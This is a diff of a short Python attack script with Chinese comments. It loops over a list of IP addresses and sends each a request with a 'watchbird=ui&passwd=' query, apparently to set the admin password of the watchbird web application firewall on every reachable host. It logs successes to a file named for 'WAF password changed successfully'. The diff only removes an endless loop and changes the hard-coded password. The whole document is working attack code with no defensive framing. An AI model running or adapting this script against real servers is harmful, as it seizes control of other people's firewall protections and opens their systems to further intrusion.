@@ -1,11 +1,10 @@
 from requests.exceptions import ReadTimeout
 import requests
 
-
 ip = []
 
 # 打开文件
-with open('./ip.txt', 'r', encoding='utf-8') as file:
+with open('ip.txt', 'r', encoding='utf-8') as file:
     # 逐行读取
     line = file.readline()
     # 循环直到文件末尾
@@ -15,17 +14,14 @@ with open('./ip.txt', 'r', encoding='utf-8') as file:
         # 读取下一行
         line = file.readline()
 
-
-
-while True:
-    for i in range(0,len(ip)):
-        try:
-            url = ip[i]+'?watchbird=ui&passwd=109longgezuishuai'
-            requests.get(url=url, timeout=0.5)
-            print(url)
-            print("改成功")
-            with open("./改waf密码成功.txt", 'a', encoding='UTF-8') as f: 
-                f.write(f"{url}\n")
-        except:
-            print(url)
-            print("改失败")
+for i in range(0, len(ip)):
+    try:
+        url = ip[i] + '?watchbird=ui&passwd=qazwsx'
+        requests.get(url=url, timeout=0.5)
+        print(url)
+        print("改成功")
+        with open("改waf密码成功.txt", 'a', encoding='UTF-8') as f:
+            f.write(f"{url}\n")
+    except:
+        print(url)
+        print("改失败")
